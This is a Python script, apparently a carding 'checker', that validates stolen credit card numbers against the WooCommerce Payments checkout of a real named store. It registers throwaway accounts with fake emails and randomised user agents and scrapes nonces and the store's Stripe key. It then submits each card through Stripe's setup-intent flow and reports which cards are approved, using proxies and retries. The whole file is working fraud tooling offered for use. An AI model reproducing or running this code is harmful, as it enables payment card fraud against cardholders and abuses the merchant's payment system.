# ============================================================
#  SA1 — Stripe Auth CCN (ljandrews.net WCPay setup intent)
#  Auth gate: returns Approved only on setup_intent success
# ============================================================

import requests
import random
import string
import secrets
import uuid
import time
import re
from datetime import datetime
from typing import Optional, Dict

try:
    from faker import Faker
except ImportError:
    Faker = None

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None

# ── helpers ──

def _gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


def _rand_email():
    fake = Faker() if Faker else None
    user = fake.user_name().lower() if fake else ''.join(random.choices(string.ascii_lowercase, k=8))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com',
               'proton.me', 'live.com', 'msn.com', 'ymail.com', 'gmx.com', 'web.de',
               'fastmail.com', 'pm.me', 'zoho.com', 'tutanota.com', 'mailbox.org']
    return f"{user}_{secrets.token_hex(4)}@{random.choice(domains)}"


# ── main flow ──

def _process(cc, mm, yy, cvv, proxy_dict=None):
    ses = requests.Session()
    if proxy_dict:
        ses.proxies.update(proxy_dict)

    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36'

    email = _rand_email()
    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mm = mm.zfill(2)
    yy = yy[-2:].zfill(2)
    cvv = cvv[:4]

    headers_base = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'user-agent': useragents,
    }

    # 1. Get register nonce
    r = ses.get('https://ljandrews.net/my-account/', headers=headers_base, timeout=25, verify=False)
    regnonce = _gstr(r.text, 'name="woocommerce-register-nonce" value="', '"')
    if not regnonce:
        return None, "Failed to get register nonce"

    # 2. Register
    reg_data = {
        'email': email,
        'wc_order_attribution_source_type': 'organic',
        'wc_order_attribution_referrer': 'https://www.google.com/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': 'google',
        'wc_order_attribution_utm_medium': 'organic',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://ljandrews.net/my-account',
        'wc_order_attribution_session_start_time': today1,
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': useragents,
        'woocommerce-register-nonce': regnonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    reg_headers = {**headers_base, 'content-type': 'application/x-www-form-urlencoded',
                   'origin': 'https://ljandrews.net', 'referer': 'https://ljandrews.net/my-account/'}
    ses.post('https://ljandrews.net/my-account/', headers=reg_headers, data=reg_data, timeout=25, verify=False)

    # 3. Navigate to add payment method
    ses.get('https://ljandrews.net/my-account/payment-methods/', headers=headers_base, timeout=25, verify=False)
    r = ses.get('https://ljandrews.net/my-account/add-payment-method/', headers=headers_base, timeout=25, verify=False)
    txt = r.text.strip()
    setupNonce = _gstr(txt, '"createSetupIntentNonce":"', '"')
    pklive = _gstr(txt, 'publishableKey":"', '"')
    acct_ = _gstr(txt, 'accountId":"', '"')

    if not setupNonce:
        return None, "Failed to get setup nonce"

    # 4. Stripe elements session
    stripe_headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': useragents,
    }
    ses.get(
        f'https://api.stripe.com/v1/elements/sessions?client_betas[0]=card_country_event_beta_1&deferred_intent[mode]=setup&deferred_intent[currency]=usd&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=usd&key={pklive}&_stripe_account={acct_}&elements_init_source=stripe.elements&referrer_host=ljandrews.net&stripe_js_id={sessionuid}&locale=en&type=deferred_intent',
        headers=stripe_headers, timeout=20, verify=False)

    # 5. Create payment method
    pm_data = {
        "billing_details[name]": "",
        "billing_details[email]": email,
        "billing_details[address][country]": "ID",
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/5e596c82e6; stripe-js-v3/5e596c82e6; payment-element; deferred-intent",
        "referrer": "https://ljandrews.net",
        "time_on_page": str(random.randint(20000, 60000)),
        "guid": guid, "muid": muid, "sid": sid,
        "key": pklive,
        "_stripe_account": acct_,
    }
    r = ses.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=pm_data, timeout=20, verify=False)
    txt = r.text.strip()
    idpm = _gstr(txt, 'id": "', '"')
    if not idpm:
        msg = _gstr(txt, 'message": "', '"') or "Payment method creation failed"
        return False, msg

    # 6. Create setup intent via WCPay
    ajax_headers = {
        'accept': '*/*',
        'origin': 'https://ljandrews.net',
        'referer': 'https://ljandrews.net/my-account/add-payment-method/',
        'user-agent': useragents,
    }
    payload = {
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, idpm),
        '_ajax_nonce': (None, setupNonce),
    }
    r = ses.post('https://ljandrews.net/wp-admin/admin-ajax.php', headers=ajax_headers, files=payload, timeout=25, verify=False)
    res = r.json()

    if res.get("success") is True and res.get("data", {}).get("status") == "succeeded":
        return True, "Card Approved"
    elif res.get("success") is True and res.get("data", {}).get("status") == "requires_action":
        return False, "3DS Required"
    elif res.get("success") is False:
        msg = _gstr(r.text, '"message":"', '"') or "Declined"
        return False, msg

    return None, "Unknown response"


# ── public API ──

def check_card(cc_line, proxy_dict=None):
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts

        for attempt in range(3):
            try:
                result, detail = _process(cc, mm, yy, cvv, proxy_dict)
                elapsed = f"{time.time() - start:.1f}s"
                if result is True:
                    return f"Approved | {detail} | {elapsed}"
                elif result is False:
                    return f"Declined | {detail} | {elapsed}"
                else:
                    if attempt < 2:
                        continue
                    return f"Error | {detail} | {elapsed}"
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout, ConnectionError, OSError):
                if attempt < 2:
                    time.sleep(0.3)
                    continue
                return f"Declined | Gateway Timeout | {time.time() - start:.1f}s"
            except Exception as e:
                return f"Error | {str(e)[:60]} | {time.time() - start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    try:
        r = requests.get('https://ljandrews.net/my-account/', timeout=15, verify=False)
        if 'woocommerce-register-nonce' in r.text:
            return True, "WCPay registration active"
        return False, "Registration form not found"
    except Exception as e:
        return False, str(e)[:60]
